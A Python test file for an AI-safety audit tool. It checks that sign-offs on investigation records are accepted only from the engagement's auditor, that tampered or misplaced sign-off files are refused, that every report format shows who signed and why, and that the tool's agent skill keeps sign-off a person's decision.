    assert _sign(records, root, "--record", "inv-after") == 0
    doc = _assess(root, records, retest=previous)
    # The sign-off stands on the record at review. The violation stands all the same.
    assert len(doc["signoffs"]["accepted"]) == 1
    (row,) = doc["remediation"]["results"]
    assert row["status"] == "needs_reinvestigation", row["why"]
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == "violations_identified"
    assert "inv-tone (previous commit)" in m2["establishing"]


# ---------------------------------------------------------------------------
# Auditor mode
# ---------------------------------------------------------------------------


def _engagement(tmp_path: Path, root: Path, commit: str) -> Path:
    eng = tmp_path / "engagement"
    argv = [
        "init",
        "--engagement",
        str(eng),
        "--target",
        str(root),
        "--mode",
        "auditor",
        "--auditor",
        "T. Auditor",
        "--organisation",
        "Test Audit Ltd",
        "--auditee",
        "Benign Ltd",
    ]
    assert eng_main(argv) == 0
    path = eng / model.ENGAGEMENT_FILE
    data = json.loads(path.read_text(encoding="utf-8"))
    data["independence"] = {
        "statement": "No financial or personal tie to the auditee.",
        "by": "T. Auditor",
        "date": "2026-10-30",
    }
    data["scope"].update(commits=[commit], deployment="staging", configuration="defaults")
    data["authorisations"] = [
        {"what": "authorisation to audit", "by": "the auditee's CTO", "date": "2026-10-29"}
    ]
    path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    return eng


def _auditor_setup(tmp_path: Path) -> tuple[Path, Path, Path]:
    root, commit = _repo(tmp_path)
    eng = _engagement(tmp_path, root, commit)
    records = eng / model.INVESTIGATIONS_DIR
    write_record(records, _record(root, commit, mode="auditor"), skeptic="upheld")
    return root, eng, records


def _auditor_assess(root: Path, eng: Path, records: Path) -> dict[str, Any]:
    return _assess(root, records, mode="auditor", engagement=model.load_engagement(eng))


@needs_git
def test_in_auditor_mode_the_auditor_signs_and_the_label_says_so(tmp_path: Path) -> None:
    root, eng, records = _auditor_setup(tmp_path)
    args = ("--record", "inv-tone", "--engagement", str(eng))
    assert _sign(records, root, *args, by="T. Auditor") == 0
    doc = _auditor_assess(root, eng, records)
    (row,) = doc["signoffs"]["accepted"]
    assert row["mode"] == "auditor" and row["self_assessed"] is False
    m2 = _mech(doc, "M2")
    assert (
        f"inv-tone closed by a person's decision: T. Auditor (auditor, sign-off {row['id']})"
        in (m2["basis"])
    )


@needs_git
def test_the_audited_team_cannot_sign(tmp_path: Path, capsys) -> None:
    root, eng, records = _auditor_setup(tmp_path)
    args = ("--record", "inv-tone", "--engagement", str(eng))
    assert _sign(records, root, *args, by="A. Developer") == 2
    assert "only the engagement's auditor" in capsys.readouterr().err
    assert not list(records.glob("signoff-*.json"))
    # By hand, the file counts for nothing.
    assert _sign(records, root, *args, by="T. Auditor") == 0
    _edit(records, by="A. Developer")
    doc = _auditor_assess(root, eng, records)
    assert doc["signoffs"]["accepted"] == []
    assert "only the engagement's auditor" in doc["signoffs"]["refused"][0]["why"][0]
    assert "record_at_review" in _kinds(_mech(doc, "M2"))


@needs_git
def test_an_auditors_sign_off_inside_the_audited_tree_counts_for_nothing(tmp_path: Path) -> None:
    # The team being audited writes to the tree. An untracked file there already stops the
    # run, so the rule is read directly: it has to hold for a file git cannot be asked about.
    root, eng, records = _auditor_setup(tmp_path)
    args = ("--record", "inv-tone", "--engagement", str(eng))
    assert _sign(records, root, *args, by="T. Auditor") == 0
    doc = json.loads(_signoff_file(records).read_text(encoding="utf-8"))
    scan = machine_scan(root, mode="auditor")
    scene = scene_of(scan, (), today=date.today(), engagement=model.load_engagement(eng))
    assert any("outside the audited tree" in why for why in refusals(doc, scene, root / "x.json"))


@needs_git
def test_the_command_refuses_an_auditors_directory_inside_the_tree(tmp_path: Path, capsys) -> None:
    root, eng, _ = _auditor_setup(tmp_path)
    args = ("--file", "nothing.sh", "--engagement", str(eng))
    assert _sign(root / ".aisafe-audit", root, *args, by="T. Auditor") == 2
    assert "outside the audited tree" in capsys.readouterr().err


@needs_git
def test_a_self_assessment_sign_off_does_not_count_in_auditor_mode(tmp_path: Path) -> None:
    root, eng, records = _auditor_setup(tmp_path)
    args = ("--record", "inv-tone", "--engagement", str(eng))
    assert _sign(records, root, *args, by="T. Auditor") == 0
    _edit(records, mode="self-assessment")
    doc = _auditor_assess(root, eng, records)
    assert doc["signoffs"]["accepted"] == []
    assert "self-assessment mode" in " ".join(doc["signoffs"]["refused"][0]["why"])


# ---------------------------------------------------------------------------
# The reports and the bundle
# ---------------------------------------------------------------------------


@needs_git
def test_every_format_names_who_signed_what_and_why(tmp_path: Path) -> None:
    root, _, records = _signed_repo(tmp_path)
    doc = _assess(root, records)
    (row,) = doc["signoffs"]["accepted"]
    assert json.loads(json.dumps(doc))["signoffs"]["accepted"][0]["by"] == NAME
    for text in (render_markdown(doc), render_html(doc), render_terminal(doc)):
        assert NAME in text and REASON in text and row["id"] in text
        assert "self-assessed" in text and "through sign-off" in text
        assert "inv-tone" in text
    assert "closed by a person" in render_markdown(doc)


@needs_git
def test_the_refused_list_shows_in_every_format(tmp_path: Path) -> None:
    root, _, records = _signed_repo(tmp_path)
    _edit(records, policy_version="0.0.1")
    doc = _assess(root, records)
    for text in (render_markdown(doc), render_html(doc), render_terminal(doc)):
        assert "refused, counts for nothing" in text and "under policy" in text


@needs_git
def test_the_bundle_lists_each_sign_off_with_its_hash(tmp_path: Path, capsys) -> None:
    root, commit, records = _signed_repo(tmp_path)
    bad = records / "signoff-other.json"
    other = json.loads(_signoff_file_of(records).read_text(encoding="utf-8"))
    bad.write_text(json.dumps({**other, "id": "signoff-other", "reason": "x is safe"}), "utf-8")
    out = tmp_path / "out"
    code = assess_main([str(root), "--investigations", str(records), "-o", str(out)])
    assert code in (0, 1)
    bundle = json.loads((out / "bundle.json").read_text(encoding="utf-8"))
    rows = [row for row in bundle["inputs"] if row["role"] == "sign-off"]
    assert len(rows) == 2 and all(len(row["sha256"]) == 64 for row in rows)
    document = json.loads((out / "assessment.json").read_text(encoding="utf-8"))
    assert sum(row["role"] == "sign-off" for row in document["inputs"]) == 2


def _signoff_file_of(records: Path) -> Path:
    return next(p for p in sorted(records.glob("signoff-*.json")) if p.name != "signoff-other.json")


# ---------------------------------------------------------------------------
# The skill
# ---------------------------------------------------------------------------


def test_the_skill_keeps_a_sign_off_a_persons() -> None:
    skill = Path(__file__).resolve().parents[2] / "src/aisafe/skills/ai-safety-audit"
    rules = (skill / "SKILL.md").read_text(encoding="utf-8")
    assert "never write or run a sign-off" in " ".join(rules.split()).lower()
    reference = (skill / "references/investigate.md").read_text(encoding="utf-8")
    assert "no way to record a person's decision" not in " ".join(reference.split())
    assert "aisafe investigate signoff" in reference
